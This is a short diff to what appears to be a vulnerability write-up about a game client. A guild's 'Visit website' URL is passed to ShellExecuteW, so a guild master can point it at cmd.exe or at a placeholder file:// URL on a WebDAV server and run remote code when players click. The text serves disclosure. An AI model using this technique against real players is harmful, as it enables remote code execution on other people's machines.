@@ -23,7 +23,10 @@ HINSTANCE ShellExecuteW(
 );
 end
 ```
-The value of the lpOperation parameter is set to L"open", which allows us, for example, to open the command line when clicking on the "Visit website" button if we set the guild's URL as "cmd.exe" as the guild master. This becomes interesting when we host our own WebDAV server, upload our custom Python/Java code to it, and then set the guild website URL to something like "file://webdavurl/code.py".
+The value of the lpOperation parameter is set to L"open", which allows us, for example, to open the command line when clicking on the "Visit website" button if we set the guild's URL as "cmd.exe" as the guild master. This becomes interesting when we host our own WebDAV server, upload our custom Python/Java code to it, and then set the guild website URL to something like
+```
+file://webdavurl/code.py
+```
 Using URI scheme "file://" is important as it is being used by Windows for WebDAV servers and when ShellExecuteW is called with lpOperation param L"open" and lpFile set as URL of our WebDAV server Windows will open and run code.py automatically, this can lead to remote code execution.
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/7DsEKg5_Ocw?si=7iXN1XVoejrtHdZQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
